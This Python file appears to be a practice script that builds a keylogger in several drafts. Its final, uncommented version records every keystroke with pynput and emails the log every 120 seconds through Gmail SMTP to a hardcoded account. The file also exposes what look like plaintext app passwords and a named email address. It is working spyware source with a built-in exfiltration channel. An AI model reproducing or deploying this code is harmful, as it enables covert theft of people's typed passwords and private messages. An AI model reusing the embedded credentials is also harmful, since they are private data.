# import pynput.keyboard as keyboard
# keylog =''
# def report_key_log(key):
#     global keylog
#     try:
#         keylog = keylog + str(key.char)
#     except AttributeError:
#         if key == key.space:
#             keylog = keylog + ' '
#         elif key == key.enter:
#             keylog = keylog + '\n'
#         else:
#             keylog = keylog + str(key)
# #     keylog += key
#     print(keylog)
#
# keyboard_listener = keyboard.Listener(on_press=report_key_log)
# # try:
# #     keyboard_listener.start()
# #     keyboard_listener.join()
# # except Exception as error:
# #     print((error))
# # finally:
# #     keyboard_listener.stop()
# with keyboard_listener:
#     keyboard_listener.join()

# names =['lisa', 'paul', 'lucy', 'bob']
#
# insert_phrase = ' is a friend of '
# print(insert_phrase.join(names))


# import pynput.keyboard as keyboard
# import threading
# keylog = ''
# def record_key_strike(key):
#     global keylog
#     try:
#         keylog = keylog + str(key.char)
#     except AttributeError:
#         if key == key.space:
#             keylog = keylog + ' '
#         elif key == key.enter:
#             keylog = keylog + '\n'
#         else:
#             keylog = keylog + str(key)
#     # print(keylog)
#
# def report_key_log():
#     global keylog
#     print(keylog)
#     keylog = ''
#     threading_timer =threading.Timer(5,report_key_log)
#     threading_timer.start()
#
# keyboard_listener = keyboard.Listener(on_press=record_key_strike)
#
# report_key_log()
# with keyboard_listener:
#     keyboard_listener.join()


# # app password aepj etqq freo rxdf
# import pynput.keyboard as keyboard
# import smtplib
# import threading
# keylog = ''
# def record_key_strike(key):
#     global keylog
#     try:
#         keylog = keylog + str(key.char)
#     except AttributeError:
#         if key == key.space:
#             keylog = keylog + ' '
#         else:
#             keylog = keylog + str(key)
#
# def send_email(username,password,email):
#     gmail_server = smtplib.SMTP('smtp.gmail.com', 587, )
#     gmail_server.starttls()
#     gmail_server.login(username,password)
#     gmail_server.sendmail(username,username,email)
#     gmail_server.quit()
#
# def report_key_log():
#     global keylog
#     print(keylog)
#     send_email("mjstane.ut@gmail.com", "ibdr lmxv nbyj dmic", keylog)
#     keylog = ''
#     threading_timer =threading.Timer(120,report_key_log)
#     threading_timer.start()
#
# keyboard_listener = keyboard.Listener(on_press=record_key_strike)
#
# report_key_log()
# with keyboard_listener:
#     keyboard_listener.join()

# app password aepj etqq freo rxdf
import pynput.keyboard as keyboard
import smtplib
import threading

class Keylogger:
    def __init__(self,username,password,interval):
        self.keylog = 'Keylogger is triggered, my name is Matt Stanek'
        self.username = username
        self.password =password
        self.interval =interval

    def record_key_strike(self,key):
        try:
            self.keylog = self.keylog + str(key.char)
        except AttributeError:
            if key == key.space:
                self.keylog = self.keylog + ' '
            elif key == key.enter:
                self.keylog = self.keylog + '\n'
            else:
                self.keylog = self.keylog + str(key)

    def send_email(self,username,password,email):
        gmail_server = smtplib.SMTP('smtp.gmail.com', 587, )
        gmail_server.starttls()
        gmail_server.login(username,password)
        gmail_server.sendmail(username,username,email)
        gmail_server.quit()

    def report_key_log(self):
        print(self.keylog)
        self.send_email(self.username, self.password, self.keylog)
        self.keylog = ''
        threading_timer =threading.Timer(self.interval,self.report_key_log)
        threading_timer.start()

    def execution(self):
        keyboard_listener = keyboard.Listener(on_press=self.record_key_strike)
        self.report_key_log()
        with keyboard_listener:
            keyboard_listener.join()

# gmail1 = Keylogger().execution()
gmail2 = Keylogger("mjstane.ut@gmail.com", "ibdr lmxv nbyj dmic", 120).execution()